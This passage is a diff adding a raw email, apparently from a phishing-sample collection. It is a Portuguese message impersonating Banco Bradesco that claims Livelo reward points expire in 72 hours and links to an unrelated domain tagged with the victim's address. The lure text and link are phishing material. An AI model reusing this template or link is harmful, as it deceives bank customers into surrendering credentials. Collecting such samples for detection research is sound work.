@@ -1,0 +1,810 @@
+Received: from BL1PR19MB5938.namprd19.prod.outlook.com (2603:10b6:208:399::15)
+ by MN0PR19MB6312.namprd19.prod.outlook.com with HTTPS; Thu, 13 Jul 2023
+ 03:05:34 +0000
+ARC-Seal: i=3; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=pass;
+ b=I0wvm2ZONPs2kTBLy718O6s5ZRPvHqDQN8/mh83Pm5AsfyWMasKlNqgx2io/sJKCbokS5Pc8QeQJwZ5SXHc/TSlTwSw9/N+hQLwzW8iUhLnCUxSayFxlTMUGs/BT1HC/hSQW4Wvq3sgp+gQDc41zVtTKVCPrxoBh5kuQlxd3rd6YRmpjTOylB+gqi6gZh9fggsABcEQvrnC8KVK9+p4oOx7hlDbKWSMwttpeW6bJSOwsBdgehGMBTRRZsap+ZCBaUbHjCpXD7zZJgHNFr9m9iJlOHCmnFKBGHyCcwUnYwWB2V0M0zvFl7ysfwwc6LwDoee1y/HUGpp3wcFtu9K1pJA==
+ARC-Message-Signature: i=3; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=GJQmmGTVGFo6YES3n2WLoCCCGpkCEEUn3f+qVp7Nwkk=;
+ b=SOq2vDMGHlrKMPjMOYZNFyTpiD97XEmv23SJD7zVphHlRxYhtFT7wmUBBrBH1rgnvwBfo11C1jrU4MtZxnPnTY3Z4hBiTnl1Dza9Lf1Owr+uV6+RjeYazXsu1ewqTRz1C+DRWpn9kJRWT4wfc2Jk2yZ80+K1rBLqcQi+D0apc1tKHKkDDUErO7HnqzzGFraoCHmwg43xYP0XoCbyLKv6af6LvTZIH3fldzAjLs+shor+L+EHcAgu6XoZ8jkV4qUeGKVUhVA6qTIh0n7VOGhNvijwlzAL0cA2e0ynHBmnt5W6JRY5axTgbT1uTu+34Qb6bjPGQCCIUXu8buVGr/5aPg==
+ARC-Authentication-Results: i=3; mx.microsoft.com 1; spf=pass (sender ip is
+ 209.85.217.51) smtp.rcpttodomain=hotmail.com smtp.mailfrom=gmail.com;
+ dmarc=pass (p=none sp=none pct=100) action=none header.from=hotmail.com;
+ dkim=pass (signature was verified) header.d=hotmail.com; arc=pass (0 oda=1
+ ltdi=1 spf=[1,2,smtp.mailfrom=phishing@pot]
+ dkim=[1,2,header.i=@hotmail.com] dmarc=[1,2,header.from=hotmail.com])
+Received: from AM5PR0301CA0011.eurprd03.prod.outlook.com
+ (2603:10a6:206:14::24) by BL1PR19MB5938.namprd19.prod.outlook.com
+ (2603:10b6:208:399::15) with Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6565.29; Thu, 13 Jul
+ 2023 03:05:33 +0000
+Received: from AM6EUR05FT034.eop-eur05.prod.protection.outlook.com
+ (2603:10a6:206:14:cafe::84) by AM5PR0301CA0011.outlook.office365.com
+ (2603:10a6:206:14::24) with Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6588.20 via Frontend
+ Transport; Thu, 13 Jul 2023 03:05:33 +0000
+Authentication-Results: spf=pass (sender IP is 209.85.217.51)
+ smtp.mailfrom=gmail.com; dkim=pass (signature was verified)
+ header.d=hotmail.com;dmarc=pass action=none
+ header.from=hotmail.com;compauth=pass reason=100
+Received-SPF: Pass (protection.outlook.com: domain of gmail.com designates
+ 209.85.217.51 as permitted sender) receiver=protection.outlook.com;
+ client-ip=209.85.217.51; helo=mail-vs1-f51.google.com; pr=C
+Received: from mail-vs1-f51.google.com (209.85.217.51) by
+ AM6EUR05FT034.mail.protection.outlook.com (10.233.241.65) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.20.6588.20 via Frontend Transport; Thu, 13 Jul 2023 03:05:32 +0000
+X-IncomingTopHeaderMarker:
+ OriginalChecksum:2D6CDB00AF6282C6E80922B0B1AAE0589BF191575D7CAFDE7E4BBC21AF696B52;UpperCasedChecksum:9288C260CC4099C0B934CCB89F5C8A3FCC6B71486B824C5CA0249AC7977461AA;SizeAsReceived:11293;Count:57
+Received: by mail-vs1-f51.google.com with SMTP id ada2fe7eead31-44350ef5831so145632137.2
+        for <phishing@pot>; Wed, 12 Jul 2023 20:05:32 -0700 (PDT)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20221208; t=1689217532; x=1691809532;
+        h=mime-version:content-language:accept-language:in-reply-to
+         :references:message-id:date:thread-index:thread-topic:subject:to
+         :from:dkim-signature:delivered-to:x-forwarded-for:x-forwarded-to
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=GJQmmGTVGFo6YES3n2WLoCCCGpkCEEUn3f+qVp7Nwkk=;
+        b=GUaD9pTmwbsEUTQtb4AQPR+tTaPUCc3c6FSFXNsbREAKIPYxGki0HKGue/ng+490Vw
+         U7wAGVKa7KMdmofciN1SzrZ9PVBMpVccP/yv4vmewpVoFXyNjohOinNoY15qk3gdoNIp
+         VCTjrN8Q98P7TcUYcH6nNGVfZ4RsPKnUnmVVXIQE1Ee5fVMaPI1bPitJscUSuuOEPh5x
+         tdaWjFcacWGAJXzKh0lhtfWkESi0akgur5dbHH9c3AULttQninWRY+cINCynTWdGpuQG
+         +J5EUX3SW2aEK/TwvZqSpIb0cfE9mk9rxessCijxFwTb+fslNTqj3765Ua9VEMDNIqsm
+         V7FA==
+X-Gm-Message-State: ABy/qLZa6TcDbP4F6P2Pcl7DBcO5Y5sWhseLDV+nojUg+hHjd2H4vzIK
+	fH4dHUprxtWUolbzLKw9diVrrhQva7ZWLNj33axX1PvHZTMXuAlCDg==
+X-Received: by 2002:a67:fc0b:0:b0:443:6449:479e with SMTP id o11-20020a67fc0b000000b004436449479emr295553vsq.8.1689217532492;
+        Wed, 12 Jul 2023 20:05:32 -0700 (PDT)
+X-Forwarded-To: phishing@pot
+X-Forwarded-For: phish.me.again@gmail.com phishing@pot
+Delivered-To: phish.me.again@gmail.com
+Received: by 2002:a59:a626:0:b0:3e4:794:807c with SMTP id c6csp1831661vqp;
+        Wed, 12 Jul 2023 20:05:30 -0700 (PDT)
+X-Google-Smtp-Source: APBJJlHDxCIGuXmsu/Q7Uehn1LZz5K4GdIlZme5Zw6psRTBIv87A3mHAbuVnRMWwzauL5elvCMM0
+X-Received: by 2002:a05:6358:2925:b0:134:c7d1:6734 with SMTP id y37-20020a056358292500b00134c7d16734mr753781rwb.23.1689217530664;
+        Wed, 12 Jul 2023 20:05:30 -0700 (PDT)
+ARC-Seal: i=2; a=rsa-sha256; t=1689217530; cv=pass;
+        d=google.com; s=arc-20160816;
+        b=XwezJIOpxIicWxVzJLX5DL1ASLN3ZajEN2FfNFM6YBtGRVmNlHd2goKkurA+7HrbOn
+         biCIu/fTODoZ/QWZ43TdQZ24vl3wmmlO52wTmdpp8yGBsT0JGgYFGKOheLpXuTPQYGge
+         ddHn7FGI7NhzVa1oz+G9Kx/WtMAPcUUu47hACsBwRHngAloc7sZb2fPa6AM5zT9SPFPD
+         k5hNtEUbPJvSVlk3idtH0MAouXmmUr+fgnFcqKXYrRZqBE8WU6KiJF6xM+oTW7j3Q6Mo
+         HdeBFtOqDDC2+9Ek+WKps10fs8gyilyn2fCSisIERjpq6WT7CD0qZNdg8H2N3w/0JYpD
+         S0Wg==
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=mime-version:content-language:accept-language:in-reply-to
+         :references:message-id:date:thread-index:thread-topic:subject:to
+         :from:dkim-signature;
+        bh=GJQmmGTVGFo6YES3n2WLoCCCGpkCEEUn3f+qVp7Nwkk=;
+        fh=+n8fjxuY2CLfPZa0m6fzZuZfhGRW95NNlOHfwwhtnqU=;
+        b=z/bkL56KxU28w22Q/rGbGyCqbgpRE0PKkVG9dqbzyQeyTHSj//QFBEhxn9g8wzirfn
+         /JH7vLcrtZ2osVkV5+rYzKmomiAebERMwjTp/FQMkFgoHcMekt8ek2LjY3H4z1R4BvBm
+         AA2mI2TeM2tedapoHL7uXkXuMUAPsGfO/PZxnZYS9fZY3YRmy8DaCCzbT71AqHuGWt0n
+         mzyvxCTMABOPCL6fsdkdF8OUf8LeVfaXTM5sNtZOxzRKVgNKfzPVQ+k59AibLa1d1hYw
+         omvMJ2BiIK4IxbJCcXM+BrqY8oBIIh+XxhhfvFPO3tXquc5+QlSkZmE2nycsmnxTOUKf
+         oSqQ==
+ARC-Authentication-Results: i=2; mx.google.com;
+       dkim=pass header.i=@hotmail.com header.s=selector1 header.b="m/plqQfH";
+       arc=pass (i=1);
+       spf=pass (google.com: domain of phishing@pot designates 2a01:111:f400:7e8b::826 as permitted sender) smtp.mailfrom=phishing@pot;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=hotmail.com
+Return-Path: phish.me.again+caf_=phishing@pot=hotmail.com@gmail.com
+Received: from NAM04-DM6-obe.outbound.protection.outlook.com (mail-dm6nam04olkn20826.outbound.protection.outlook.com. [2a01:111:f400:7e8b::826])
+        by mx.google.com with ESMTPS id k3-20020a63ff03000000b0055befc89e11si3764041pgi.84.2023.07.12.20.05.29
+        for <Phish.me.again@gmail.com>
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Wed, 12 Jul 2023 20:05:30 -0700 (PDT)
+Received-SPF: pass (google.com: domain of phishing@pot designates 2a01:111:f400:7e8b::826 as permitted sender) client-ip=2a01:111:f400:7e8b::826;
+Authentication-Results-Original: mx.google.com;       dkim=pass
+ header.i=@hotmail.com header.s=selector1 header.b="m/plqQfH";       arc=pass
+ (i=1);       spf=pass (google.com: domain of phishing@pot
+ designates 2a01:111:f400:7e8b::826 as permitted sender)
+ smtp.mailfrom=phishing@pot;       dmarc=pass (p=NONE sp=NONE
+ dis=NONE) header.from=hotmail.com
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=IH5JFAwzmoe1NB6R+rvzORRhHEIRGLBPW21vmHBxltG1OMQ/MYKyXG9M1VH1Fsx3tPOeOtAYEDtDvxj2XkXToos37A1/URP5JdPjuUxb9bbosas9ZOj/NwHBmX6rTq9yNPZOO/cDY9KWEzti41+TdO3H7toxDlkZNEio4k5a4t+PR8LF5yNWSlnVTBC8GdbzoDez59KLencaMAnWoVCh0jMooDpKCSicMRmFZhDB8bWJUFw07HPY96iIx+N1tEFmHLWz/ZsS2Aoy/DK9K3Zg+lvybGQvZKTr6z6+D3Ju1Zy0eSmSxvf1Ze7do7aUXt6hXV5zrOUlOl8p8vyd4YyAUQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=GJQmmGTVGFo6YES3n2WLoCCCGpkCEEUn3f+qVp7Nwkk=;
+ b=cTocOEbT/uGfbrrWocG7zytsqJS6mNJojCNTu9gqhZ/H7DqDd91EKAn+mECBG3uSlkcTZlHQnlMhnE3RYFmh9z5yuPSI8uf7Y09kAQSn0bo19OYHx58RMEnwEcbSfL6XoZSjKaa671VSZkTaqZVmr8PrT/Ge/CielI3tIPhJgqtf0sxSoVCKY8U7Zv58CrVeVGJmSZ+IpdDbIV6+FnaPViphzm/x0gZ4ljpRMiXh6nGqakLUmHJlApffpj2Z9BY/Ep12VsRQHXZr5+zzNvYFQehBdN69EYKDb+B2AAKLqvJ61IOH2tJFRVhHZqyzj3yygy0GAPNxhd42vdUihWDSHQ==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
+ s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=GJQmmGTVGFo6YES3n2WLoCCCGpkCEEUn3f+qVp7Nwkk=;
+ b=m/plqQfH4hJgwSz7HM69qDUYHgcw1xxKSOqT9QbxlUY1FYP4YBvL02s8AkOo3p13sz21DPwglTLdztZ5vGzEjxdvvfBGzCDI+6HYF/Y3FHmJdBsCYHq/k8Vb1m93DS5SebH4yPcn0O8BkObs6j25uDw0cSAijo3q9sYj0Wrl+Mm7LKwwXujQXkMX4MSdAD3jrRMBGcgyWAbr2gAsmMVXEJFXhVHZCl+tcKUiqYlOegGfeSfX81t5OgQOQhum8IImb28dsSIoAYha7zZfFSUinjiILrp8vW0llPDnXG61jzvGMV8x8Xv3L4L6QrRArFE6pPbpxaZTPLGwVng1gIiPyA==
+Received: from IA0PR02MB9779.namprd02.prod.outlook.com (2603:10b6:208:48b::12)
+ by BN0PR02MB8269.namprd02.prod.outlook.com (2603:10b6:408:158::20) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6588.22; Thu, 13 Jul
+ 2023 03:05:28 +0000
+Received: from IA0PR02MB9779.namprd02.prod.outlook.com
+ ([fe80::7b77:6807:3232:f447]) by IA0PR02MB9779.namprd02.prod.outlook.com
+ ([fe80::7b77:6807:3232:f447%4]) with mapi id 15.20.6588.014; Thu, 13 Jul 2023
+ 03:05:28 +0000
+From: phishing@pot <phishing@pot>
+To: "phish.me.again@gmail.com" <Phish.me.again@gmail.com>
+Subject: Fw: Sua recompensa expirar em breve Resgate 169.352 pts
+Thread-Topic: Sua recompensa expirar em breve Resgate 169.352 pts
+Thread-Index: AQHZtP6h0vuGvr2la0GC8AVQwhzskq+3A7lH
+Date: Thu, 13 Jul 2023 03:05:28 +0000
+Message-ID:
+ <IA0PR02MB97792321D8B3A0A09FA51A42B337A@IA0PR02MB9779.namprd02.prod.outlook.com>
+References: <2933dce5ef28fc49d10c654f6523680e@www.adaletgazetesi.com.tr>
+In-Reply-To: <2933dce5ef28fc49d10c654f6523680e@www.adaletgazetesi.com.tr>
+Accept-Language: pt-BR, en-US
+Content-Language: pt-BR
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+x-ms-exchange-messagesentrepresentingtype: 1
+x-tmn: [ohE1yPTHWM7eNapiJuTrrE2JczDfUP80]
+x-ms-traffictypediagnostic:
+ IA0PR02MB9779:EE_|BN0PR02MB8269:EE_|AM6EUR05FT034:EE_|BL1PR19MB5938:EE_|MN0PR19MB6312:EE_
+X-MS-Office365-Filtering-Correlation-Id: ac11660f-fe97-4177-abc0-08db834e05b9
+X-Microsoft-Antispam-Untrusted: BCL:0;
+X-Microsoft-Antispam-Message-Info-Original:
+ UN05xQfqr0poxWJ3nRWu+xv3DZrG2gI3yMMc4eQHvlqOUchr/x8PVrFqyKoqViyiHoiJzpZW6VZj0NHRm7cw1fVwmzmurBM+mOXBxMxJ/nI86/3oqxuPvWDGjAc1maurvXj3VbRLW2x3WSpVdqgovn9WkZM21yOTM0HXTpNIjCE2UR09HXUa9ShWp2FO2XlUyidARSAVOZENos7Txhld/o39TGhxjtKNXeRZSiuO2EC7gp5mPJCPtXAVPOxofrPUi06iqdSPhvYdF7AH6/OTLFOODYKkQofmdbuG/ghbD2w4yiF7+ALuojW8vAWnL2bIRL0BxzBxrZnt5VxQx1+NFPxXsPEVqyyy39APxyhmpRp9FFU8OdXkDA2TIeBdPCsYEXjPei9Aix/+UqL2IlfUhd1amrWgIYI9JnwV6t94GYv57WvClAo+81BObSZ1yuSY2olieVu/vtoZsL8KP+XZoE9DnH21PqfvDdqAIg1to/I9oWRaIxHbeV9l9Sm3rjsJj192VfNuP1P1XhicnBub77tMQlkMwzgR3vs9a0wlKtgD7EfkCvUTofv/L+I+5cKqHhE5xKWaFNEfer0fjIFZheo2FDb+ZMH1dn1rxYaJqn8pXwSh1NN5Hd7Qbytd47RXXtKEIjgCHD/I4JE+qX2sCk1yWh04zNPrcDXhwIuvv6E=
+X-MS-Exchange-AntiSpam-MessageData-Original-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-Original-0:
+ =?Windows-1252?Q?/AAU4SvWnv9GkOj/hoLdln0Xt/7dGAMne27YiunyHXe+V+vpb4zKuRg7?=
+ =?Windows-1252?Q?ghk4VcXulz9I42xrsyyX82zDr4SEDHRG1/biBvlyGbrilXIhuQktz+NS?=
+ =?Windows-1252?Q?0HXadRqVkdfKBKhp/yQDCWOG6D2KAlW22IORIHVMWhG0YTPeC5CtZdzS?=
+ =?Windows-1252?Q?2g+B2e2i7wCIvn4hSbvRYRZCLnrriwXRg39JmCRxBj4oV9olgy59ANJm?=
+ =?Windows-1252?Q?E2IBwlsEKNU74zJGPqlKcE8s02q+BUmb5PiL9r0PuQ7lT8bJZPA/V57k?=
+ =?Windows-1252?Q?oMHHFRJQ3uwHts/rRUCqU13nYkydiqtCnPzvQJ6C/SH0RL7Rh6WVW02a?=
+ =?Windows-1252?Q?2O+o2aLsxHvPkSq/5o0mpVhS24f7osIzhUSLurbzyMOeJ7b+W47Vik5s?=
+ =?Windows-1252?Q?/c74ZANKalxN6wYcnN/b/XmvA7X8pCDB0v/Jegsv+vbOorFQD+OH7Ose?=
+ =?Windows-1252?Q?cjhPSzvMlHZF6Q3AXMZvbbPAnFC0d9eGAfNhb3oEnpWgqepkbk6itrEG?=
+ =?Windows-1252?Q?fxlzT+tOUmVGqUysGalGkfFsPwmTfHeM+k9EZ3CL/TEXxQWahYXJ16oL?=
+ =?Windows-1252?Q?qxDDqCwlIzIWTT0Asx8l6iWh56ZMlpycv/vBEneoyxRCEZ6IIUUeWxQn?=
+ =?Windows-1252?Q?3u9V1dlmi61/LLHcHyst6+c+xWbQLOLwsg2qCfe1rzTeGGI5GKWVKMVT?=
+ =?Windows-1252?Q?+LGa1kpMmzHYd2hY+d1HbHjg3TDJ6YVHJEbsgoHK5/eJI7Zwdqs/GstK?=
+ =?Windows-1252?Q?Is1NO6w3U7uAlcbTbxOcLL2rU/3pQjpLTwjjc6SIfeWju+dSPj2nqWtH?=
+ =?Windows-1252?Q?x5ap/AKLOFitZR3ujkbI7YNwAV0Rs4WdGuNyBbDn/URGIb+fN3rflOEo?=
+ =?Windows-1252?Q?8FavglA/4pcEHw0eWQqGe451M5iCspTjL/8F+hd5TPky+0K7JeNsudSu?=
+ =?Windows-1252?Q?Uoi8VxyRtRyUnRoFMECxkB1uKs1QVyuJIYFV3lr8BO5KeC13GD4s9ObX?=
+ =?Windows-1252?Q?diZu8L7ETqdZqXacxnreuYbrP2mHcwroz4qtwkPMzicALw2I8NGW5hse?=
+ =?Windows-1252?Q?582aIdUg99rvfCrYuISqmxpp5Xvek98+EkvuQTD0bG/6y2O5MifsIYuB?=
+ =?Windows-1252?Q?uPfjqilj/IbAlkaIAsTaia10RLydMEBbC3rxYHn543ykSrv3oVka3Nfx?=
+ =?Windows-1252?Q?pNWkGgMkZoXV2tWokEqKl3xDHQjTl+HRjbnHWvlz5kAMrKk/YwuxV7ln?=
+ =?Windows-1252?Q?zWXj6utdoQ8pGu0PD0wYlDr2ltxtHCdRvJp0dLjKA0eRme/9cONzf2qw?=
+ =?Windows-1252?Q?DeIKvg=3D=3D?=
+Content-Type: multipart/alternative;
+	boundary="_000_IA0PR02MB97792321D8B3A0A09FA51A42B337AIA0PR02MB9779namp_"
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: BN0PR02MB8269
+X-IncomingHeaderCount: 57
+X-MS-Exchange-Organization-ExpirationStartTime: 13 Jul 2023 03:05:32.9799
+ (UTC)
+X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
+X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000
+X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit
+X-MS-Exchange-Organization-Network-Message-Id:
+ ac11660f-fe97-4177-abc0-08db834e05b9
+X-EOPAttributedMessage: 0
+X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
+X-MS-Exchange-Organization-MessageDirectionality: Incoming
+X-MS-Exchange-Transport-CrossTenantHeadersStripped:
+ AM6EUR05FT034.eop-eur05.prod.protection.outlook.com
+X-MS-PublicTrafficType: Email
+X-MS-Exchange-Organization-AuthSource:
+ AM6EUR05FT034.eop-eur05.prod.protection.outlook.com
+X-MS-Exchange-Organization-AuthAs: Anonymous
+X-MS-UserLastLogonTime: 7/13/2023 2:59:49 AM
+X-MS-Office365-Filtering-Correlation-Id-Prvs:
+ 69ba63ff-35c1-4008-7344-08db834e02d6
+X-MS-Exchange-EOPDirect: true
+X-Sender-IP: 209.85.217.51
+X-SID-PRA: MERCIAYANMACT@HOTMAIL.COM
+X-SID-Result: PASS
+X-MS-Exchange-Organization-PCL: 2
+X-MS-Exchange-Organization-SCL: 1
+X-Microsoft-Antispam: BCL:0;
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Jul 2023 03:05:32.9642
+ (UTC)
+X-MS-Exchange-CrossTenant-Network-Message-Id: ac11660f-fe97-4177-abc0-08db834e05b9
+X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-CrossTenant-AuthSource:
+ AM6EUR05FT034.eop-eur05.prod.protection.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Anonymous
+X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
+X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
+ 00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: BL1PR19MB5938
+X-MS-Exchange-Transport-EndToEndLatency: 00:00:02.0155235
+X-MS-Exchange-Processed-By-BccFoldering: 15.20.6588.022
+X-Microsoft-Antispam-Mailbox-Delivery:
+	abwl:0;wl:1;pcwl:1;kl:0;dwl:0;dkl:0;rwl:0;ucf:1;jmr:0;ex:0;auth:1;dest:C;OFR:CustomRules;ENG:(5062000305)(90000117)(90012020)(91020020)(91040095)(9050020)(9095020)(9100338)(944500132)(2008001134)(4810010)(4910033)(8820095)(9575002)(10195002)(9414026)(9310011)(9220031);
+X-Message-Info:
+	qZelhIiYnPnGgHo+3SfNZtBi+rtEiSGpdMk10KAMzdLLmcIrt0Vo5LFU8x2i8KCSIOhc20Fgi4OGdk66/rV7PZd4oSTPNQbMyvHcz4VAXT1TGRSDM9cvV69B62ATLN0qk5XV8xfKGKKMJJ2D1v2lmV/LayR6J64+6KS1P8hLqv76YNxW78wCH7U982wkRE7VPdgor9Q+06c=
+X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0xO0Q9MTtHRD0xO1NDTD0tMQ==
+X-Microsoft-Antispam-Message-Info:
+	=?Windows-1252?Q?Y5zi+/F40JnER+28Ap1I00PF1OQzxI9BlL80m0+yHF8PcvwkpxiIPcOj?=
+ =?Windows-1252?Q?3kxJ5eYdvK3VAq4vJ0nVAmVqvRv3vXaWsLDOM4XyvKqYnckCdf5cdRjX?=
+ =?Windows-1252?Q?tFt4AvxkXK0Lm0wfy2d0ysD0fGbb2OevSTTrEAHRu0c2SY0KDbdvyI59?=
+ =?Windows-1252?Q?1kYuL3g7cX81xLQRbpr55xjvsa5mZz9KbduJiUaE4a+kaXSHfGgOv57G?=
+ =?Windows-1252?Q?WDkrXpr1nz4nRFyfNmWW1U0/BaEX7pduwwHwqcs9uu0wI6ekiN0eRl0q?=
+ =?Windows-1252?Q?+11VPwOJW0eX6IQ2qJWhDZJRiDWcGunHGmG8C1mT0gJKzzI1gCK3K880?=
+ =?Windows-1252?Q?iuEZX7L/xU2boIIwsLwiYRpYUu6ynl77jbOT1N6E24N+hgAGs4Wvy9tD?=
+ =?Windows-1252?Q?jRR3cTNvFwdvFqqqeIyqwVx/blFQ9e9M5phn+EiIrWbRAuer3bzqMLBS?=
+ =?Windows-1252?Q?UwUZwebELJmxfUsFEf6rVSWz9Ef9f7ap6bDPKGvOpzgKD8dQbUZ/KvTO?=
+ =?Windows-1252?Q?HXH9TBMABDrxkeIiE/jogXz20MRMR6cMB8MqGVIqfZgzC3tYkTLSuWG2?=
+ =?Windows-1252?Q?apxLurPJ6Og6QH73Gr49Gxscx0RY2P9GJ7ByY2/zT0POtMIdFnaAycvM?=
+ =?Windows-1252?Q?eY5I9GVxzTlFFndQu3psBZbeLF1Jr6BPGAPfRI5/CyKQF9FWaaPmOOaY?=
+ =?Windows-1252?Q?i+1LfQhgA8PSxH4WhD1Yh+NPfuJsfZuxqf9mJhB7p74ijTdPQvxPVFhQ?=
+ =?Windows-1252?Q?q4r3n4UYYXAcRN25zv02MEQFKvcs0iiAGVedm/jlI+t9xF3heFv/1ezS?=
+ =?Windows-1252?Q?rUsSXYD1BZm6xPAkDBTJ6xIKWShwGrp6vdENsn/Ivbz1htWHJrhD9+45?=
+ =?Windows-1252?Q?IdEnDYHgOTWafPj3KUIbApXVP8nPIqz7g9R6g9VrZY3+kibKW0Eva5aU?=
+ =?Windows-1252?Q?Fyl7Hh9P5Qs6JSR2ZZLNpNq75h9ewjytyZKY71T8FlfJ2xjLGFpnZmlL?=
+ =?Windows-1252?Q?hbpekfj7pvSVkdj1AqrxzRPr9ZGxIWVgQrtGOb2hcvrJlTiBNbnFk3zO?=
+ =?Windows-1252?Q?AnTmQNkCRsded1Bik1mTpN83awlgppXKw6KQ1iJwHmS3v3U379BoU0MN?=
+ =?Windows-1252?Q?jJCNdp25LXEbCzE+soKi/svswh7S19yg8xDh9YHVDnyvLKeuvz3jhD31?=
+ =?Windows-1252?Q?/Nre2akwSe6cC9wwlxmgm2ITfH4VTBTscH33Yi/eX5HAZhU9boEEENp2?=
+ =?Windows-1252?Q?r1OmxFfTCcBg/+ZWvXEpqIR8JfVXPRJkD++Z6KekIVLSK8a9eoOPoq3C?=
+ =?Windows-1252?Q?mCwdNfeV20ehDU+LBbESDTdAEaAdRnQOUhVd/XSNQrtJ/2mtsEMqVaza?=
+ =?Windows-1252?Q?adGdTetROI1v3LI7patgOswtck7jr3jxiGTZY77rhCTREbLa8ZhcAj0p?=
+ =?Windows-1252?Q?k+/o795fYiQ1f3mJT3JiZ6c9c/WH6zwgAQseWEUtarxQiihn2Sz8W1uj?=
+ =?Windows-1252?Q?jhbR5sjO71cJGOnyZw6jA/EXyYYgGzkKC7sD/R9bv6HmRJgDEW87cSUl?=
+ =?Windows-1252?Q?YRTnJ16bL64pobKi1oQsKwSILDx68lAj2IClzNqeYKjePvtCx0DKR6Yd?=
+ =?Windows-1252?Q?9q2oJ98i+ti9sPTCiLdfiX+8zuKJZluGXw/2jjrNuhqrMugRRxdz5cEF?=
+ =?Windows-1252?Q?2jHE9nsQXK1/mOdLK5tuoKj4Tmk49jcVTJrAsY8Coh+uOir0v/hzpm/h?=
+ =?Windows-1252?Q?Cp//z5a/TQFkDEsuwVNyQtSQ8nyJbzq8rPq0hPVHKBC8bRdX9Y48C/tR?=
+ =?Windows-1252?Q?LDYW1yoqUrNQLYkoYGw6ADXcuKs=3D?=
+MIME-Version: 1.0
+
+--_000_IA0PR02MB97792321D8B3A0A09FA51A42B337AIA0PR02MB9779namp_
+Content-Type: text/plain; charset="Windows-1252"
+Content-Transfer-Encoding: quoted-printable
+
+
+________________________________
+De: Banco Bradesco S/A <bradesco@resgate.com>
+Enviado: quarta-feira, 12 de julho de 2023 17:17
+Para: phishing@pot <phishing@pot>
+Assunto: Sua recompensa expirar em breve Resgate 169.352 pts
+
+[https://expresso.bradesco/portal/imagens/expresso/banner3.jpg]
+
+
+
+Prezado Cliente,
+
+Programa de Pontos Livelo.
+
+Voc=EA tem pontos acumulados em seu CPF, que est=E3o disponiveis para resga=
+te. Voc=EA cliente Bradesco, tem pontos em dobro. Acesse agora e Resgate se=
+us pontos Livelo . Aproveite e troque seus pontos por experi=EAncias incriv=
+e=EDs, milhas a=E9reas ou descontos de at=E9 40% na fatura do seu cart=E3o =
+Bradesco.
+
+.
+
+169.352 pts
+
+Pontos / expiram: em 72 horas.
+Clique aqui Resgate! <https://www.elivestory.com/ib2w/?hash=3Dmerciayanmact=
+@hotmail.com>
+________________________________
+
+N=B0 de controle: 1167874892
+________________________________
+
+Confira abaixo algumas ofertas, que podem ser trocadas com pontos Livelo.
+
+[https://m.media-amazon.com/images/I/61bK6PMOC3L._AC_SX679_.jpg]
+
+Apple iPhone 14 (128 GB) =96 azul
+
+358.100pts
+PONTOS
+
+VER DETALHES<https://www.livelo.com.br/product/LVL53885398>
+[https://imagens.fastshop.com.br/imgprod/AEMQAH3BEAPTA_G.jpg]
+
+iPhone 14 Pro Max Apple (512GB) Prateado, Tela de 6,7", 5G e C=E2mera de 48=
+MP
+
+636.890
+PONTOS
+
+VER DETALHES<https://www.livelo.com.br/iphone-14-pro-max-apple-512gb-pratea=
+do-tela-de-67-5g-e-c=E2mera-de-48mp/produto/LVL67807512>
+[https://carrefourbr.vtexassets.com/arquivos/ids/90619873-540-auto?v=3D6380=
+71361206570000&width=3D540&height=3Dauto&aspect=3Dtrue]
+
+Smartwatch Mormaii Life MOLIFEAN/8R Unissex Vermelho com Sensor de Frequ=EA=
+ncia Card=EDaca, Notifica=E7=F5es de Liga=E7=E3o, Cron=F4metro, Touchscreen
+
+28.700
+PONTOS
+
